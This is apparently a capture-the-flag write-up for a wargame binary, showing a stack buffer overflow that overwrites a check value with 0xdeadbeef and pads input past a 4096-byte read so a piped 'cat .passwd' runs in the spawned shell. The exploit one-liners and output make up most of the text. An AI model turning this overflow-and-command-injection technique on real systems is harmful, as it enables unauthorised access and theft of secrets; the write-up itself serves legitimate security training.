The overflow is quite easy, after 40 bytes, the input will go to the buffer.

binary13@challenge02:~$ echo -n `python -c "print '0'*40+'\xef\xbe\xad\xde'"` | ./binary13

[buf]: 0000000000000000000000000000000000000000ﾭ▒
[check] 0xdeadbeef
Yeah dude ! You win !
But forcing the stdin via pipe or file redirection forces the forked process (’dash’) to read from the inherited stdin. Having a look to strace, the parent reads 4096 bytes at once. Thus to give input to the child we just need to give what we want after 4096.

binary13@challenge02:~$ echo -n `python -c "print '0'*40+'\xef\xbe\xad\xde'+'0'*4052+'cat .passwd'"` | ./binary13

[buf]: 0000000000000000000000000000000000000000ﾭ▒
[check] 0xdeadbeef
Yeah dude ! You win !
1w4[...]p1s